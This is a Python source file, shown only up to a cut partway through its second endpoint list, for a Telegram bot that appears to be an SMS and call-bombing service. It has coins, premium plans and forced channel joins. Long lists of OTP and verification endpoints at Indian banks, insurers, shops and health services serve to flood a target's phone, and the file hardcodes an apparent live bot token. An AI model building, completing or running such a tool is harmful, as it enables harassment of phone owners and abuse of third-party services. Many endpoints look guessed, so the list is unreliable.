import asyncio, aiohttp, logging, re, random, hashlib, aiosqlite, time, json
from html import escape
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes


# ✨ Stylish text helper — keeps commands, HTML tags, URLs and code placeholders intact.
def stylish_text(text):
    if not isinstance(text, str):
        return text
    import re
    chars = {
        'A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ꜰ','G':'ɢ','H':'ʜ','I':'ɪ','J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ',
        'N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'ǫ','R':'ʀ','S':'s','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ',
        'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ꜰ','g':'ɢ','h':'ʜ','i':'ɪ','j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ',
        'n':'ɴ','o':'ᴏ','p':'ᴘ','q':'ǫ','r':'ʀ','s':'s','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ'
    }
    # Protect HTML, Telegram commands, URLs, and dynamic/code placeholders.
    protected=[]
    def protect(m):
        protected.append(m.group(0)); return f'\x00{len(protected)-1}\x00'
    pattern=r'<[^>]*>|https?://\S+|/\w+|\{[^{}]*\}|`[^`]*`|@[A-Za-z0-9_]+|<code>.*?</code>'
    out=re.sub(pattern, protect, text, flags=re.S)
    out=''.join(chars.get(c,c) for c in out)
    for i,v in enumerate(protected): out=out.replace(f'\x00{i}\x00',v)
    return out

BOT_TOKEN = "8916407786:AAHoexrj6DcecWW_OI94wgSkT-O-goEr0RU"
ADMIN_CHAT_ID = 8309654045
REQUIRED_CHANNELS = [{"username": "@hgdeqq976", "id": -1004487171241}, {"username": "@kiuyu41", "id": -1004377864894}]
PREMIUM_PRICES = {7: 50, 30: 100}

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)
active_tasks, bot_username = {}, None

def cb(text, *, callback_data=None, url=None, style="primary"):
    kw = {}
    if callback_data is not None: kw["callback_data"] = callback_data
    if url is not None: kw["url"] = url
    try: return InlineKeyboardButton(text, style=style, **kw)
    except (TypeError, ValueError): return InlineKeyboardButton(text, **kw)

async def init_db():
    async with aiosqlite.connect('referral.db') as db:
        await db.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
            last_name TEXT, referrer_id INTEGER, referral_code TEXT UNIQUE, coins INTEGER DEFAULT 0,
            referred_count INTEGER DEFAULT 0, premium_until INTEGER DEFAULT 0)''')
        await db.execute('''CREATE TABLE IF NOT EXISTS redeem_codes (code TEXT PRIMARY KEY, amount INTEGER NOT NULL,
            max_uses INTEGER NOT NULL, used_count INTEGER DEFAULT 0, created_by INTEGER)''')
        await db.execute('CREATE TABLE IF NOT EXISTS user_protections (user_id INTEGER, phone_number TEXT, PRIMARY KEY (user_id, phone_number))')
        await db.execute('CREATE TABLE IF NOT EXISTS global_protections (phone_number TEXT PRIMARY KEY)')
        try: await db.execute("ALTER TABLE users ADD COLUMN premium_until INTEGER DEFAULT 0")
        except aiosqlite.OperationalError: pass
        await db.commit()

async def q(sql, params=(), fetch=None, commit=False):
    async with aiosqlite.connect('referral.db') as db:
        cur = await db.execute(sql, params)
        if commit: await db.commit()
        if fetch == 'one': return await cur.fetchone()
        if fetch == 'all': return await cur.fetchall()
        return cur

def gen_code(uid): return hashlib.md5(f"{uid}{random.randint(1000,9999)}".encode()).hexdigest()[:8]
async def get_user(uid): return await q('SELECT * FROM users WHERE user_id=?', (uid,), 'one')
async def get_coins(uid):
    r = await q('SELECT coins FROM users WHERE user_id=?', (uid,), 'one'); return r[0] if r else 0
async def update_coins(uid, d): await q('UPDATE users SET coins=coins+? WHERE user_id=?', (d, uid), commit=True)
async def get_ref_code(uid):
    r = await q('SELECT referral_code FROM users WHERE user_id=?', (uid,), 'one'); return r[0] if r else None
async def create_user(uid, un, fn, ln, rid=None, code=None):
    await q('INSERT INTO users (user_id,username,first_name,last_name,referrer_id,referral_code,coins,premium_until) VALUES (?,?,?,?,?,?,0,0)',
            (uid, un, fn, ln, rid, code or gen_code(uid)), commit=True)
async def ensure_user(update, context):
    u = update.effective_user
    if not u: return None
    if not await get_user(u.id): await create_user(u.id, u.username or "", u.first_name or "", u.last_name or "")
    return await get_user(u.id)

async def is_premium(uid):
    r = await q('SELECT premium_until FROM users WHERE user_id=?', (uid,), 'one')
    return bool(r and r[0] > int(time.time()))
async def get_expiry(uid):
    r = await q('SELECT premium_until FROM users WHERE user_id=?', (uid,), 'one'); return r[0] if r else 0
async def set_premium(uid, days):
    new = max(await get_expiry(uid), int(time.time())) + days * 86400
    await q('UPDATE users SET premium_until=? WHERE user_id=?', (new, uid), commit=True)
async def remove_premium(uid): await q('UPDATE users SET premium_until=0 WHERE user_id=?', (uid,), commit=True)
async def buy_premium(uid, days):
    if days not in PREMIUM_PRICES: return False, "Invalid plan."
    cost = PREMIUM_PRICES[days]
    if await get_coins(uid) < cost: return False, f"Insufficient coins. Need {cost} coins."
    await update_coins(uid, -cost); await set_premium(uid, days)
    exp = datetime.fromtimestamp(await get_expiry(uid)).strftime("%Y-%m-%d %H:%M:%S")
    return True, f"✅ Premium activated for {days} days!\n💰 {cost} coins deducted.\n📅 Expires on: {exp}"

def clean_phone(p): return re.sub(r'\D', '', p)
async def add_protection(uid, p):
    p = clean_phone(p)
    if not p: return False
    try: await q('INSERT INTO user_protections VALUES (?,?)', (uid, p), commit=True); return True
    except aiosqlite.IntegrityError: return False
async def remove_protection(uid, p):
    c = await q('DELETE FROM user_protections WHERE user_id=? AND phone_number=?', (uid, clean_phone(p)), commit=True)
    return c.rowcount > 0
async def get_protections(uid):
    rows = await q('SELECT phone_number FROM user_protections WHERE user_id=?', (uid,), 'all')
    return [r[0] for r in rows]
async def is_protected(uid, p):
    return await q('SELECT 1 FROM user_protections WHERE user_id=? AND phone_number=?', (uid, clean_phone(p)), 'one') is not None
async def add_gp(p):
    p = clean_phone(p)
    if not p: return False
    try: await q('INSERT INTO global_protections VALUES (?)', (p,), commit=True); return True
    except aiosqlite.IntegrityError: return False
async def remove_gp(p):
    c = await q('DELETE FROM global_protections WHERE phone_number=?', (clean_phone(p),), commit=True)
    return c.rowcount > 0
async def is_gp(p):
    return await q('SELECT 1 FROM global_protections WHERE phone_number=?', (clean_phone(p),), 'one') is not None
async def list_gp():
    rows = await q('SELECT phone_number FROM global_protections', (), 'all'); return [r[0] for r in rows]

async def create_redeem(amount, mx, by):
    code = hashlib.md5(f"{by}{random.randint(10000,99999)}{amount}{mx}".encode()).hexdigest()[:8].upper()
    await q('INSERT INTO redeem_codes VALUES (?,?,?,0,?)', (code, amount, mx, by), commit=True)
    return code
async def redeem_code(uid, code):
    row = await q('SELECT amount,max_uses,used_count FROM redeem_codes WHERE code=?', (code,), 'one')
    if not row: return False, "Invalid code."
    amount, mx, used = row
    if used >= mx: return False, "This code has reached its maximum uses."
    await q('UPDATE redeem_codes SET used_count=used_count+1 WHERE code=?', (code,), commit=True)
    await q('UPDATE users SET coins=coins+? WHERE user_id=?', (amount, uid), commit=True)
    return True, f"You received {amount} coins!"

async def check_membership(uid, context):
    missing = []
    for ch in REQUIRED_CHANNELS:
        try:
            m = await context.bot.get_chat_member(chat_id=ch["id"], user_id=uid)
            if m.status in ["left", "kicked"]: missing.append(ch["username"])
        except Exception as e:
            logger.warning(f"Membership check failed for {ch['username']}: {e}"); missing.append(ch["username"])
    return len(missing) == 0, missing

async def send_force_subscribe_message(chat_id, context, missing):
    kbd = [[cb(f"Join {u}", url=f"https://t.me/{u.lstrip('@')}")] for u in missing]
    kbd.append([cb("✅ I have joined", callback_data="check_subscribe")])
    text = "🔒 <b>Access Restricted</b>\n\nYou must join the following channels to use this bot:\n\n"
    for u in missing: text += f"• {u}\n"
    text += "\nAfter joining, click the button below."
    await context.bot.send_message(chat_id, stylish_text(text), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kbd))

async def broadcast(context, msg):
    users = await q('SELECT user_id FROM users', (), 'all')
    ok = fail = 0
    for i, (uid,) in enumerate(users, 1):
        try: await context.bot.send_message(uid, stylish_text(msg), parse_mode="HTML"); ok += 1
        except Exception as e: logger.warning(f"Broadcast failed to {uid}: {e}"); fail += 1
        if i % 30 == 0: await asyncio.sleep(1)
    return len(users), ok, fail

# -----------------------------😂 APIS -----------------------------
APIS = [
    {"name": "FreeFire Bomber", "url": lambda p, d: f"https://freefire-api.ct.ws/bomber4.php?phone={p}&duration={d}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}},
    {"name": "Call Bomber API", "url": lambda p, d: f"https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb?number={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}},
    {"name": "Bomberr API", "url": lambda p, d: f"https://bomberr.onrender.com/num={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}},
    {"name": "Lenskart", "url": lambda p, d: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "Hungama", "url": lambda p, d: "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un"}}'},
    {"name": "Meru Cab", "url": lambda p, d: "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"mobile_number={p}"},
    {"name": "Dayco India", "url": lambda p, d: "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"api=send_otp&mob={p}"},
    {"name": "NoBroker", "url": lambda p, d: "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"phone={p}&countryCode=IN"},
    {"name": "ShipRocket", "url": lambda p, d: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'},
    {"name": "PenPencil", "url": lambda p, d: "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
    {"name": "1mg", "url": lambda p, d: "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"number":"{p}","otp_on_call":true}}'},
    {"name": "KPN Fresh", "url": lambda p, d: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'},
    {"name": "Servetel", "url": lambda p, d: "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"mobile_number={p}"},
    {"name": "Swiggy Call", "url": lambda p, d: "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Tata Capital", "url": lambda p, d: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "Doubtnut", "url": lambda p, d: "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"phone_number":"{p}","language":"en"}}'},
    {"name": "GoPink Cabs", "url": lambda p, d: "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"check_mobile_number=1&contact={p}"},
    {"name": "Myntra", "url": lambda p, d: "https://www.myntra.com/gw/mobile-auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Flipkart", "url": lambda p, d: "https://2.rome.api.flipkart.com/api/4/user/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'},
    {"name": "Amazon", "url": lambda p, d: "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"email={p}&create=1"},
    {"name": "Zomato", "url": lambda p, d: "https://www.zomato.com/php/asyncLogin.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"phone={p}"},
    {"name": "Paytm", "url": lambda p, d: "https://accounts.paytm.com/signin/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}","loginData":"LOGIN_USING_PHONE"}}'},
    {"name": "PhonePe", "url": lambda p, d: "https://www.phonepe.com/api/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "BigBasket", "url": lambda p, d: "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile_number":"{p}"}}'},
    {"name": "Meesho", "url": lambda p, d: "https://api.meesho.com/v2/auth/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Snapdeal", "url": lambda p, d: "https://www.snapdeal.com/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Makemytrip", "url": lambda p, d: "https://www.makemytrip.com/api/umbrella/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "OYO", "url": lambda p, d: "https://api.oyoroomscrm.com/api/v2/user/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Rapido", "url": lambda p, d: "https://rapido.bike/api/v2/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Uber", "url": lambda p, d: "https://auth.uber.com/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Domino's", "url": lambda p, d: "https://order.godominos.co.in/Online/App.aspx", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"PhoneNo={p}"},
    {"name": "BookMyShow", "url": lambda p, d: "https://in.bmscdn.com/mjson/User/SendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNo":"{p}"}}'},
    {"name": "Netmeds", "url": lambda p, d: "https://www.netmeds.com/api/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Medlife", "url": lambda p, d: "https://api.medlife.com/v2/user/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Practo", "url": lambda p, d: "https://www.practo.com/patient/loginviapassword", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Ajio", "url": lambda p, d: "https://www.ajio.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'},
    {"name": "Nykaa", "url": lambda p, d: "https://www.nykaa.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Croma", "url": lambda p, d: "https://api.croma.com/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Reliance Digital", "url": lambda p, d: "https://www.reliancedigital.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "FirstCry", "url": lambda p, d: "https://www.firstcry.com/api/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Licious", "url": lambda p, d: "https://api.licious.com/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Zepto", "url": lambda p, d: "https://api.zepto.com/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Blinkit", "url": lambda p, d: "https://blinkit.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Mobikwik", "url": lambda p, d: "https://www.mobikwik.com/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Freecharge", "url": lambda p, d: "https://www.freecharge.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Airtel Thanks", "url": lambda p, d: "https://www.airtel.in/thanks-app/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Jio", "url": lambda p, d: "https://www.jio.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Vodafone Idea", "url": lambda p, d: "https://www.myvi.in/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Byju's", "url": lambda p, d: "https://byjus.com/api/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Unacademy", "url": lambda p, d: "https://unacademy.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Vedantu", "url": lambda p, d: "https://www.vedantu.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Toppr", "url": lambda p, d: "https://www.toppr.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "WhiteHat Jr", "url": lambda p, d: "https://www.whitehatjr.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Cult.fit", "url": lambda p, d: "https://www.cult.fit/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "HealthifyMe", "url": lambda p, d: "https://www.healthifyme.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Pristyn Care", "url": lambda p, d: "https://www.pristyncare.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "PharmEasy", "url": lambda p, d: "https://pharmeasy.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Apollo 24/7", "url": lambda p, d: "https://www.apollo247.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "MFine", "url": lambda p, d: "https://www.mfine.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "DocsApp", "url": lambda p, d: "https://www.docsapp.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Lybrate", "url": lambda p, d: "https://www.lybrate.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Portea Medical", "url": lambda p, d: "https://www.portea.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "PolicyBazaar", "url": lambda p, d: "https://www.policybazaar.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "CoverFox", "url": lambda p, d: "https://www.coverfox.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Acko", "url": lambda p, d: "https://www.acko.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Digit Insurance", "url": lambda p, d: "https://www.godigit.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "HDFC Ergo", "url": lambda p, d: "https://www.hdfcergo.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "ICICI Lombard", "url": lambda p, d: "https://www.icicilombard.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Bajaj Allianz", "url": lambda p, d: "https://www.bajajallianz.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Star Health", "url": lambda p, d: "https://www.starhealth.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Max Bupa", "url": lambda p, d: "https://www.maxbupa.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Kotak Life", "url": lambda p, d: "https://www.kotaklife.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "SBI Life", "url": lambda p, d: "https://www.sbilife.co.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "LIC India", "url": lambda p, d: "https://www.licindia.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "HDFC Life", "url": lambda p, d: "https://www.hdfclife.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Axis Bank", "url": lambda p, d: "https://www.axisbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "ICICI Bank", "url": lambda p, d: "https://www.icicibank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "HDFC Bank", "url": lambda p, d: "https://www.hdfcbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
]

# ULTIMATEAPIS (JSON-style, converted & merged below)
ULTIMATEAPIS = [
    {'name': 'Meesho WhatsApp', 'url': 'https://meesho.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Nykaa SMS', 'url': 'https://nykaa.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Paytm WhatsApp', 'url': 'https://paytm.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Uber WhatsApp', 'url': 'https://uber.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Jupiter WhatsApp', 'url': 'https://jupiter.money/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Meesho Call', 'url': 'https://meesho.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Pokerbaazi WhatsApp', 'url': 'https://pokerbaazi.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Meesho WhatsApp', 'url': 'https://meesho.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Rapido SMS', 'url': 'https://rapido.bike/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Goibibo SMS', 'url': 'https://goibibo.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Rapido Call', 'url': 'https://rapido.bike/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Amazon Call', 'url': 'https://amazon.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Instamart SMS', 'url': 'https://instamart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Gokwik SMS', 'url': 'https://gokwik.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Zomato Call', 'url': 'https://zomato.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
